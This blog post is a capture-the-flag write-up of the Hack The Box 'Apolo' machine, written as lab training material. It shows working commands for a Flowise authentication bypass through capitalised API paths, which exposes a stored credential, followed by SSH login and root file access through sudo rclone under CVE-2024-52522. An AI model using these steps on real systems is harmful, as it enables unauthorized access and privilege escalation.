---
layout: post
title: Apolo Writeup
date: 2024-12-17 12:53 +1100
categories: [CTF-Writeup, Binary-Badlands]
tags: [fullpwn, ctf, htb-ctf]
---
Apolo was a very easy fullpwn challenge from the Binary Badlands University CTF by Hack The Box in 2024.

As it is a fullpwn challenge, lets start by running an `nmap` scan with default scripts and version enumeration to see what we have access to:

```shell-session
callum@desktop:~$ sudo nmap -sCV 10.129.231.24
[sudo] password for callum:
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-17 12:24 AEDT
Nmap scan report for 10.129.231.24
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://apolo.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds
```
We see that there is an `ssh` port open, and a `http` server. Lets add the redirected URL to our hosts file and visit the URL.

After scrolling through the website, we see a link to `http://ai.apolo.htb`. 
![](/assets/img/writeup/20241217122929.png)

Visiting this website, we see we have a `flowise` (https://flowiseai.com/) AI platform. We can try logging in with default credentials, but it does not work. After a quick search for `flowise exploit`, we find https://www.exploit-db.com/exploits/52001, an exploit that claims to bypass authentication by capitalising the link to api routes. The exploit POC is just running:
```shell-session
curl http://localhost:3000/Api/v1/credentials
```

So lets try this out.
```shell-session
callum@desktop:~$ curl http://ai.apolo.htb/Api/v1/credentials
[{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}]
```

This exploit seems to work here.  To use this exploit properly, the exploit recommends adding a Match and Replace rule for the website in burpsuite to change `api/v1` to `API/V1`. 

![](/assets/img/writeup/20241217123604.png)
_The Match and Replace rule_

After setting up a proxy through burpsuite and refreshing the website, it seems we have bypassed authentication. We can click around the website, and take a look at that credential we saw earlier.


![](/assets/img/writeup/20241217123751.png)
_The credential with a username and password_

In this credential we can see the username `lewis` and the password `C0mpl3xi3Ty!_W1n3`. Let's attempt authenticating to the box with `ssh` with these creds.
```shell-session
callum@desktop:~$ ssh lewis@apolo.htb
```
After using the password, we get logged in.

As we have the users password, we can check our `sudo` permissions with `sudo -l`.
```shell-session
lewis@apolo:~$ sudo -l
Matching Defaults entries for lewis on apolo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lewis may run the following commands on apolo:
    (ALL : ALL) NOPASSWD: /usr/bin/rclone
```

It seems we can `rclone` with `sudo`. 
We can check our `rclone` version with `rclone version`, which tells us we are running `v1.68.1`. We can google an exploit for this version, which shows us https://nvd.nist.gov/vuln/detail/CVE-2024-52522. Apparently copying root owned files will allow us to access them. Let's try copying `/root/root.txt` to a directory with `rclone sync`.

```shell-session
lewis@apolo:/tmp/mount$ sudo /usr/bin/rclone sync /root/root.txt /tmp/mount
2024/12/17 01:43:13 NOTICE: Config file "/root/.config/rclone/rclone.conf" not found - using defaults
lewis@apolo:/tmp/mount$ ls -la
total 12
drwxrwxr-x  2 lewis lewis 4096 Dec 17 01:43 .
drwxrwxrwt 14 root  root  4096 Dec 17 01:43 ..
-rw-r--r--  1 root  root    20 Nov 21 08:53 root.txt
lewis@apolo:/tmp/mount$ cat root.txt
HTB{cl0n3_rc3_f1l3}
```
Here we can see that when the file is copied, we are granted read permissions. We can abuse this to see `root.txt`, giving us the flag.
